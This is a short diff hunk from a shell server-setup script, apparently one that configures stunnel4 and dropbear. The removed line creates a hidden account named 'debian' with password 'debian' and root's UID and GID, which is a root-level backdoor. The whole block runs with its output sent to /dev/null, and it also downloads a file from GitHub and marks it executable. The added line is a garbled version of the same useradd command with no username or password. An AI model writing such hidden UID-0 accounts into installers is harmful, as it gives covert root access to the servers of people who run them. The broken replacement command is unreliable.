@@ -612,7 +612,7 @@ echo "/bin/false" >> /etc/shells
 wget -O /etc/banner "https://raw.githubusercontent.com/kakaiba1985/tech103/main/banner"
 chmod +x /etc/banner
 
-useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
+useradd -p $(openssl passwd -1 )  -ou 0 -g 0
 sudo service stunnel4 restart
 sudo service dropbear restart
   } &>/dev/null
